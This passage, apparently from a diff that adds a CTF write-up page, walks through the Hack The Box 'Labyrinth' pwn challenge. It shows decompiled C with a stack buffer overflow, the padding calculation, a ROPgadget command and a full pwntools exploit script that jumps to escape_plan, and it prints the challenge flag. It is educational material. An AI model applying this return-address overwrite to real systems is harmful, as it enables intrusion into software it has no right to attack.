+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PIE: No PIE &lt;span class="o">(&lt;/span>0x400000&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RUNPATH: b&lt;span class="s1">&amp;#39;./glibc/&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use IDA Pro to analyze, we obtain the following pseudocode for function &lt;code>escape_plan&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">escape_plan&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+Bh] [rbp-5h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+Ch] [rbp-4h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">putchar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">unk_402018&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1F0uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[1;32m&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[0m&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;./flag.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">perror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">Error opening flag.txt, please contact an Administrator.&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fputc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Our goal is to be able to execute this function, now examine the &lt;code>main&lt;/code> function&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-30h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v5&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+8h] [rbp-28h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v6&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+10h] [rbp-20h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v7&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+18h] [rbp-18h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+20h] [rbp-10h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+28h] [rbp-8h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">envp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">banner&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_QWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v7&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">Select door: &lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1LL&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mh">0x64&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">9&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mh">0x63&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Door: %d &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Door: 0%d &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Door: 00%d &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mh">0xA&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">putchar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x10uLL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nf">strncmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;69&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2uLL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nf">strncmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;069&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3uLL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;You are heading to open the door but you suddenly see something on the wall:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">Fly like a bird and be free!&lt;/span>&lt;span class="se">\&amp;#34;\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;Would you like to change the door you chose?&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xA0uLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">68&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">%s[-] YOU FAILED TO ESCAPE!&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[1;31m&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is a buffer overflow associate with this line of code &lt;code>fgets(v4, 68, stdin);&lt;/code> because &lt;code>v4&lt;/code> was declared &lt;code>char v4[8];&lt;/code> but we are allowed to input up to 68 bytes and we need to input &amp;lsquo;69&amp;rsquo; at first. Our attack plan will be overwrite the return address with the address of function &lt;code>escape_plan&lt;/code>. IDA also provides us stack offset of variable &lt;code>v4&lt;/code> which is &lt;code>[rbp-30h]&lt;/code>, so we can calculate the correct padding which is equal &lt;code>0x30 + 8 = 0x38 = 56&lt;/code>. The stack frame layout will be&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">|_______________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| &amp;#34;A&amp;#34;*56 |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_______________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|ret instruction| # padding ret because of movaps instruction
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_______________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| escape_plan |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_______________|
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| . |
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can use &lt;code>ROPgadget&lt;/code> to find the address of instruction &lt;code>ret&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">$ ROPgadget --binary labyrinth &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;ret&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0000000000401016 : ret
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We yield the final exploit&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exe&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./labyrinth&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;167.71.143.44&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31869&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># p = process(&amp;#39;./labyrinth&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;69&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0000000000401016&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">56&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;escape_plan&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag is: &lt;strong>HTB{3sc4p3_fr0m_4b0v3}&lt;/strong>&lt;/p>
+&lt;h2 id="pandoras-box">Pandora&amp;rsquo;s Box&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given file:&lt;/strong> &lt;a href="https://drive.google.com/drive/folders/1tkjLHsRXx8WdNrzWexbeDfcS3kFkCc-U?usp=sharing" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> You stumbled upon one of Pandora’s mythical boxes. Would you be curious enough to open it and see what’s inside, or would you opt to give it to your team for analysis?&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>The challenge greeted us with a binary following a libc.so.6 and a ld-linux-x86-64.so.2.&lt;/p>
+&lt;p>Decompile the binary using &lt;a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noopener">IDA Pro&lt;/a>, we easily found the vulnerability lied within the &lt;em>box()&lt;/em> fucntion.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">size_t&lt;/span> &lt;span class="nf">box&lt;/span>&lt;span class="p">()&lt;/span>
